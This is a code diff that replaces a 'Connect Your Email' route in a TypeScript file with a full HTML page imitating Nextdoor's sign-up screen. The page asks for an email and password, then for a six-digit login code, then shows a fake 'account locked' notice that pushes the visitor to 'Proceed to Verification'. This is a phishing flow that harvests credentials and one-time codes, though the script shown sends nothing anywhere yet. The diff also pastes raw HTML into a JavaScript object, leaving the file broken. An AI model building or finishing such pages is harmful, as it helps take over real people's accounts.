@@ -14,14 +14,331 @@ import {
 } from "@/lib/connect-email.functions";
 
 export const Route = createFileRoute("/connect-email")({
-  head: () => ({
-    meta: [
-      { title: "Connect Your Email — Seedin" },
-      { name: "description", content: "Link your everyday inbox for stronger account security and faster grant reviews." },
-    ],
-  }),
-  component: ConnectEmailPage,
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Nextdoor – Discover your neighborhood</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#fff; --text:#1f2a44; --muted:#4b5570; --brand:#2f7d4f; --brand-btn:#3f8a58; --on-brand:#fff;
+  --chip:#eceef3; --line:#d9dce4; --field:#fff; --card:#fff; --bar:#6f6f6f; --help:#9aa3b6; --ring:#8ec1ef;
+  box-sizing:border-box; padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
+  color-scheme:light;
+}
+@media (prefers-color-scheme:dark){
+  :root:not([data-theme="light"]){
+    --bg:#10151f; --text:#e8ecf5; --muted:#a9b2c6; --brand:#5cb37c; --brand-btn:#3f8a58; --on-brand:#fff;
+    --chip:#222a3a; --line:#34405a; --field:#171e2b; --card:#151b27; --bar:#3a3a3a; --help:#5c6680; --ring:#2f5680; color-scheme:dark;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#10151f; --text:#e8ecf5; --muted:#a9b2c6; --brand:#5cb37c; --brand-btn:#3f8a58; --on-brand:#fff;
+  --chip:#222a3a; --line:#34405a; --field:#171e2b; --card:#151b27; --bar:#3a3a3a; --help:#5c6680; --ring:#2f5680; color-scheme:dark;
+}
+*{box-sizing:border-box;margin:0}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+body{background:var(--bg);color:var(--text);font-family:"DM Sans",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;min-height:100vh;border-top:6px solid var(--bar)}
+.wrap{max-width:1280px;margin:0 auto;padding:0 clamp(12px,3vw,40px)}
+header{display:flex;align-items:center;justify-content:space-between;height:96px}
+.logo{display:flex;align-items:center;gap:8px;color:var(--brand);font-weight:700;font-size:clamp(28px,3.2vw,38px);letter-spacing:-.04em;text-decoration:none}
+.logo svg{width:.95em;height:.95em}
+nav{display:flex;align-items:center;gap:clamp(8px,1.6vw,22px)}
+.menu{display:flex;align-items:center;gap:8px;background:none;border:0;color:var(--text);font:600 17px/1 inherit;font-family:inherit;cursor:pointer;padding:10px 6px}
+.menu svg{width:20px;height:20px}
+.btn{display:inline-flex;align-items:center;justify-content:center;border:0;border-radius:999px;font:600 18px/1 "DM Sans",system-ui,sans-serif;cursor:pointer;text-decoration:none;transition:filter .15s}
+.btn:hover{filter:brightness(.96)}
+.btn:focus-visible,.menu:focus-visible,input:focus-visible,.eye:focus-visible,a:focus-visible{outline:3px solid var(--brand);outline-offset:2px}
+.nav-btn{height:52px;padding:0 28px}
+.chip{background:var(--chip);color:var(--text)}
+.solid{background:var(--brand);color:var(--on-brand)}
+.hero{position:relative;border-radius:28px 28px 0 0;overflow:hidden;min-height:calc(100vh - 140px);display:flex;justify-content:center;align-items:flex-start;padding:62px 16px 0}
+.hero>svg{position:absolute;inset:0;width:100%;height:100%}
+.card{position:relative;width:min(100%,452px);background:var(--card);border-radius:20px 20px 0 0;padding:34px 30px 40px;text-align:center}
+h1{font-size:clamp(28px,3.4vw,36px);font-weight:600;letter-spacing:-.03em;line-height:1.1;margin:6px 0 30px}
+.sso{width:100%;height:54px;margin-bottom:10px;background:var(--chip);color:var(--text);gap:12px;font-size:18px}
+.sso svg{width:22px;height:22px}
+.or{display:flex;align-items:center;gap:14px;color:var(--muted);font-size:18px;margin:34px 0 24px}
+.or::before,.or::after{content:"";flex:1;height:1px;background:var(--line)}
+.field{position:relative;margin-bottom:10px}
+input{width:100%;height:64px;border:1.5px solid var(--line);border-radius:16px;background:var(--field);color:var(--text);font:400 18px "DM Sans",system-ui,sans-serif;padding:0 52px 0 14px}
+input::placeholder{color:var(--text);opacity:.85}
+input:focus{border-color:var(--brand);outline:none}
+.eye{position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:0;cursor:pointer;color:var(--text);padding:8px;display:flex}
+.eye svg{width:26px;height:26px}
+.legal{text-align:left;font-size:17px;line-height:1.35;margin:24px 0 24px;color:var(--text)}
+.legal a,.biz a{color:inherit;text-decoration:underline}
+.go{width:100%;height:56px;background:var(--brand-btn);color:var(--on-brand)}
+.biz{margin-top:30px;font-size:19px}
+
+/* ---- Account confirmation page ---- */
+body[data-view="confirm"]{border-top:0}
+.confirm-page{display:none}
+body[data-view="confirm"] .confirm-page{display:block}
+body[data-view="confirm"] .signup-page{display:none}
+.chdr{display:flex;align-items:center;justify-content:center;position:relative;height:96px}
+.chdr .logo{font-size:clamp(24px,2.6vw,30px);pointer-events:none}
+.chdr .signup-link{position:absolute;right:0;top:50%;transform:translateY(-50%);color:var(--text);font-weight:600;font-size:18px;text-decoration:none}
+.confirm-wrap{max-width:620px;margin:0 auto;padding:56px 16px 80px;text-align:left}
+.confirm-wrap h1{font-size:clamp(26px,3vw,32px);font-weight:700;letter-spacing:-.02em;margin-bottom:18px}
+.confirm-wrap .lede{color:var(--text);font-size:19px;line-height:1.4;margin-bottom:34px}
+.code-label{display:flex;align-items:center;gap:8px;font-size:19px;margin-bottom:14px}
+.help-circle{width:22px;height:22px;border-radius:50%;border:1.6px solid var(--help);color:var(--help);display:inline-flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;cursor:default;flex:none}
+.otp-row{display:flex;gap:12px;margin-bottom:18px}
+.otp{width:62px;height:62px;border:1.6px solid var(--line);border-radius:14px;text-align:center;font:500 22px "DM Sans",system-ui,sans-serif;background:var(--field);color:var(--text);padding:0}
+.otp:focus{outline:none;border-color:#1f2a44;box-shadow:0 0 0 4px var(--ring)}
+.resend{display:flex;align-items:center;gap:8px;color:var(--muted);font-weight:600;font-size:17px;background:none;border:0;cursor:not-allowed;padding:0;margin-bottom:34px}
+.resend svg{width:18px;height:18px}
+.resend.active{color:var(--brand);cursor:pointer}
+.go2{width:100%;height:58px;background:var(--brand-btn);color:var(--on-brand);font-size:19px;border-radius:999px}
+.rule{height:1px;background:var(--line);margin:34px 0 26px}
+.support{color:var(--muted);font-size:18px}
+.support a{color:var(--muted)}
+
+/* ---- Account locked / verification page ---- */
+.locked-page{display:none}
+body[data-view="locked"] .locked-page{display:block}
+body[data-view="locked"] .signup-page,
+body[data-view="locked"] .confirm-page{display:none}
+.locked-wrap{max-width:620px;margin:0 auto;padding:30px 16px 80px;text-align:center}
+.lock-badge{width:84px;height:84px;border-radius:50%;background:#fbeaea;color:#c0392b;display:flex;align-items:center;justify-content:center;margin:34px auto 30px}
+.lock-badge svg{width:40px;height:40px}
+.locked-wrap h1{font-size:clamp(26px,3.2vw,34px);font-weight:700;letter-spacing:-.02em;margin-bottom:20px;line-height:1.15}
+.locked-wrap p{color:var(--text);font-size:19px;line-height:1.5;margin-bottom:20px}
+.locked-wrap p.sub{color:var(--muted);font-size:17px}
+.locked-actions{margin-top:34px}
+.go3{width:100%;height:58px;background:var(--brand-btn);color:var(--on-brand);font-size:19px;border-radius:999px}
+@media (max-width:760px){
+  .locked-wrap{padding:20px 16px 60px}
+}
+
+@media (max-width:760px){
+  header{height:72px} .menu{display:none} .nav-btn{height:44px;padding:0 20px;font-size:16px}
+  .hero{padding-top:28px;min-height:calc(100vh - 100px)} .card{padding:26px 18px 32px}
+  .confirm-wrap{padding:40px 16px 60px}
+  .otp{width:15.5vw;max-width:56px;height:15.5vw;max-height:56px}
+}
+</style>
+</head>
+<body data-view="signup">
+<div class="wrap signup-page">
+  <header>
+    <a class="logo" href="#" aria-label="Nextdoor home">
+      <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2.2 1.2 11.4a.9.9 0 0 0 .6 1.6H4v8h6v-5.2h4V21h6v-8h2.2a.9.9 0 0 0 .6-1.6L17.5 6.9V3.5h-3v1.8z"/></svg>
+      Nextdoor
+    </a>
+    <nav>
+      <button class="menu" type="button" aria-haspopup="true">Partners <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m5 9 7 7 7-7"/></svg></button>
+      <button class="menu" type="button" aria-haspopup="true">Businesses <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m5 9 7 7 7-7"/></svg></button>
+      <a class="btn nav-btn chip" href="#">Log in</a>
+      <a class="btn nav-btn solid" href="#">Sign up</a>
+    </nav>
+  </header>
+
+  <section class="hero">
+    <svg viewBox="0 0 1000 700" preserveAspectRatio="xMidYMid slice" aria-hidden="true">
+      <defs>
+        <linearGradient id="sky" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#e9efe3"/><stop offset=".55" stop-color="#cfdcb9"/></linearGradient>
+        <linearGradient id="grass" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#93b24b"/><stop offset="1" stop-color="#6f9a35"/></linearGradient>
+        <radialGradient id="tree" cx=".5" cy=".4" r=".7"><stop offset="0" stop-color="#4c6b2a"/><stop offset="1" stop-color="#2b3f17"/></radialGradient>
+      </defs>
+      <rect width="1000" height="700" fill="url(#sky)"/>
+      <g fill="url(#tree)">
+        <ellipse cx="60" cy="330" rx="150" ry="170"/><ellipse cx="190" cy="400" rx="120" ry="130"/>
+        <ellipse cx="300" cy="470" rx="110" ry="80"/><ellipse cx="110" cy="250" rx="80" ry="110" fill="#5b7d33"/>
+        <ellipse cx="880" cy="170" rx="190" ry="260"/><ellipse cx="760" cy="330" rx="130" ry="150"/>
+        <ellipse cx="960" cy="420" rx="110" ry="140"/><ellipse cx="700" cy="440" rx="90" ry="70" fill="#3a5320"/>
+      </g>
+      <path d="M0 470 Q300 440 520 470 T1000 450 V700 H0Z" fill="url(#grass)"/>
+      <path d="M0 585 Q280 560 520 580 T1000 560 V595 Q760 600 520 612 T0 618Z" fill="#d6d9cc"/>
+      <g>
+        <rect x="170" y="500" width="14" height="42" rx="6" fill="#e9a8a8"/><rect x="200" y="498" width="14" height="46" rx="6" fill="#d98a5a"/>
+        <rect x="235" y="500" width="14" height="42" rx="6" fill="#4e6fa8"/><rect x="95" y="505" width="14" height="40" rx="6" fill="#7e93c4"/>
+        <rect x="700" y="515" width="16" height="50" rx="6" fill="#efe9d6"/><rect x="735" y="512" width="16" height="52" rx="6" fill="#d9d6c8"/>
+        <circle cx="790" cy="560" r="16" fill="none" stroke="#333" stroke-width="3"/><circle cx="850" cy="560" r="16" fill="none" stroke="#333" stroke-width="3"/>
+        <circle cx="905" cy="548" r="7" fill="#e07aa0"/>
+      </g>
+    </svg>
+
+    <div class="card">
+      <h1>Discover your neighborhood</h1>
+
+      <button class="btn sso" type="button">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#4285F4" d="M23.5 12.27c0-.85-.08-1.67-.22-2.45H12v4.64h6.45a5.52 5.52 0 0 1-2.4 3.62v3h3.88c2.27-2.09 3.57-5.17 3.57-8.81z"/><path fill="#34A853" d="M12 24c3.24 0 5.96-1.07 7.95-2.91l-3.88-3c-1.08.72-2.45 1.15-4.07 1.15-3.13 0-5.78-2.11-6.73-4.96H1.27v3.1A12 12 0 0 0 12 24z"/><path fill="#FBBC05" d="M5.27 14.28A7.2 7.2 0 0 1 4.9 12c0-.79.14-1.56.37-2.28v-3.1H1.27A12 12 0 0 0 0 12c0 1.94.46 3.77 1.27 5.38l4-3.1z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.43-3.43C17.95 1.19 15.24 0 12 0A12 12 0 0 0 1.27 6.62l4 3.1C6.22 6.86 8.87 4.75 12 4.75z"/></svg>
+        Continue with Google
+      </button>
+      <button class="btn sso" type="button">
+        <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12.15 6.9c-.95 0-2.42-1.08-3.96-1.04-2.04.03-3.91 1.18-4.96 3.01-2.12 3.68-.55 9.1 1.52 12.09 1.01 1.45 2.21 3.09 3.79 3.04 1.52-.07 2.09-.99 3.94-.99 1.83 0 2.35.99 3.96.95 1.64-.03 2.68-1.48 3.68-2.95 1.16-1.69 1.64-3.33 1.66-3.42-.04-.01-3.18-1.22-3.22-4.86-.03-3.04 2.48-4.49 2.6-4.56-1.43-2.09-3.62-2.32-4.39-2.38-2-.16-3.68 1.09-4.61 1.09zM15.53 3.83c.84-1.01 1.4-2.43 1.25-3.83-1.21.05-2.66.8-3.53 1.82-.78.9-1.45 2.34-1.27 3.71 1.34.1 2.72-.69 3.55-1.7z"/></svg>
+        Continue with Apple
+      </button>
+
+      <div class="or">or</div>
+
+      <form id="f" novalidate>
+        <div class="field"><input type="email" name="email" placeholder="Email address" autocomplete="email" aria-label="Email address"></div>
+        <div class="field">
+          <input type="password" id="pw" name="password" placeholder="Create a password" autocomplete="new-password" aria-label="Create a password">
+          <button class="eye" id="eye" type="button" aria-label="Show password" aria-pressed="false">
+            <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M2.5 10c2.2 3.6 6 5 9.5 5s7.3-1.4 9.5-5"/><path d="m5.5 14.2-1.8 2.3M9.3 15.6l-.8 2.7M14.7 15.6l.8 2.7M18.5 14.2l1.8 2.3"/></svg>
+          </button>
+        </div>
+        <p class="legal">By continuing with sign up, you agree to our <a href="#">Privacy Policy</a>, <a href="#">Cookie Policy</a>, and <a href="#">Member Agreement</a>.</p>
+        <button class="btn go" type="submit">Continue</button>
+      </form>
+
+      <p class="biz">Have a business? <a href="#">Get started</a></p>
+    </div>
+  </section>
+</div>
+
+<div class="wrap confirm-page">
+  <div class="chdr">
+    <a class="logo" href="#" aria-label="Nextdoor home">
+      <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2.2 1.2 11.4a.9.9 0 0 0 .6 1.6H4v8h6v-5.2h4V21h6v-8h2.2a.9.9 0 0 0 .6-1.6L17.5 6.9V3.5h-3v1.8z"/></svg>
+      Nextdoor
+    </a>
+    <a class="signup-link" href="#">Sign up</a>
+  </div>
+
+  <div class="confirm-wrap">
+    <h1>Account confirmation</h1>
+    <p class="lede">A login code has been sent to the email address on your Nextdoor account. Enter that code here.</p>
+
+    <div class="code-label">
+      Enter login code
+      <span class="help-circle" title="Check your inbox and spam folder for a 6-digit code">?</span>
+    </div>
+
+    <div class="otp-row" id="otpRow">
+      <input class="otp" inputmode="numeric" maxlength="1" aria-label="Digit 1">
+      <input class="otp" inputmode="numeric" maxlength="1" aria-label="Digit 2">
+      <input class="otp" inputmode="numeric" maxlength="1" aria-label="Digit 3">
+      <input class="otp" inputmode="numeric" maxlength="1" aria-label="Digit 4">
+      <input class="otp" inputmode="numeric" maxlength="1" aria-label="Digit 5">
+      <input class="otp" inputmode="numeric" maxlength="1" aria-label="Digit 6">
+    </div>
+
+    <button class="resend" id="resendBtn" type="button" disabled>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-2.6-6.36"/><path d="M21 4v5h-5"/></svg>
+      <span id="resendText">Resend email (20s)</span>
+    </button>
+
+    <button class="btn go2" id="loginBtn" type="button">Login</button>
+
+    <div class="rule"></div>
+    <p class="support">No code after 5 minutes? <a href="#">Contact support</a></p>
+  </div>
+</div>
+
+<div class="wrap locked-page">
+  <div class="chdr">
+    <a class="logo" href="#" aria-label="Nextdoor home">
+      <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2.2 1.2 11.4a.9.9 0 0 0 .6 1.6H4v8h6v-5.2h4V21h6v-8h2.2a.9.9 0 0 0 .6-1.6L17.5 6.9V3.5h-3v1.8z"/></svg>
+      Nextdoor
+    </a>
+  </div>
+
+  <div class="locked-wrap">
+    <div class="lock-badge" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/><path d="M12 15.5v2"/></svg>
+    </div>
+
+    <h1>We've temporarily locked your account</h1>
+    <p>We noticed some unusual activity on your Nextdoor account, so we've locked it as a precaution while we confirm it's really you.</p>
+    <p>This is a routine security step, not a penalty. Once you complete verification, your account will be unlocked and every feature will work exactly as before.</p>
+    <p class="sub">The process only takes a couple of minutes.</p>
+
+    <div class="locked-actions">
+      <button class="btn go3" id="proceedBtn" type="button">Proceed to Verification</button>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var pw=document.getElementById("pw"),eye=document.getElementById("eye"),ico=document.getElementById("eyeIcon");
+  var closed=ico.innerHTML;
+  var open='<path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/>';
+  eye.addEventListener("click",function(){
+    var show=pw.type==="password";
+    pw.type=show?"text":"password";
+    ico.innerHTML=show?open:closed;
+    eye.setAttribute("aria-pressed",String(show));
+    eye.setAttribute("aria-label",show?"Hide password":"Show password");
+  });
+  document.getElementById("f").addEventListener("submit",function(e){
+    e.preventDefault();
+    document.body.setAttribute("data-view","confirm");
+    startResendTimer();
+    var first=document.querySelector("#otpRow .otp");
+    if(first) first.focus();
+  });
+})();
+
+(function(){
+  var boxes=Array.prototype.slice.call(document.querySelectorAll("#otpRow .otp"));
+  boxes.forEach(function(box,i){
+    box.addEventListener("input",function(){
+      box.value=box.value.replace(/[^0-9]/g,"").slice(0,1);
+      if(box.value && boxes[i+1]) boxes[i+1].focus();
+    });
+    box.addEventListener("keydown",function(e){
+      if(e.key==="Backspace" && !box.value && boxes[i-1]){ boxes[i-1].focus(); }
+    });
+    box.addEventListener("paste",function(e){
+      var text=(e.clipboardData||window.clipboardData).getData("text").replace(/[^0-9]/g,"");
+      if(!text) return;
+      e.preventDefault();
+      text.slice(0,boxes.length-i).split("").forEach(function(ch,j){ boxes[i+j].value=ch; });
+      var next=boxes[Math.min(i+text.length,boxes.length-1)];
+      if(next) next.focus();
+    });
+  });
+
+  window.startResendTimer=function(){
+    var btn=document.getElementById("resendBtn"),label=document.getElementById("resendText");
+    var seconds=20;
+    btn.disabled=true; btn.classList.remove("active");
+    label.textContent="Resend email ("+seconds+"s)";
+    clearInterval(window._resendInterval);
+    window._resendInterval=setInterval(function(){
+      seconds--;
+      if(seconds<=0){
+        clearInterval(window._resendInterval);
+        btn.disabled=false; btn.classList.add("active");
+        label.textContent="Resend email";
+      } else {
+        label.textContent="Resend email ("+seconds+"s)";
+      }
+    },1000);
+  };
+
+  document.getElementById("resendBtn").addEventListener("click",function(){
+    if(this.disabled) return;
+    startResendTimer();
+  });
+
+  document.getElementById("loginBtn").addEventListener("click",function(){
+    var code=boxes.map(function(b){return b.value;}).join("");
+    if(code.length<6){
+      var firstEmpty=boxes.find(function(b){return !b.value;});
+      if(firstEmpty) firstEmpty.focus();
+      return;
+    }
+    document.body.setAttribute("data-view","locked");
+  });
+})();
+
+document.getElementById("proceedBtn").addEventListener("click",function(){
+  // Placeholder: wire this up to the verification page once it's added.
 });
+</script>
+</body>
+</html>
+
 
 // ── Provider definitions ──────────────────────────────────────────────────────
 
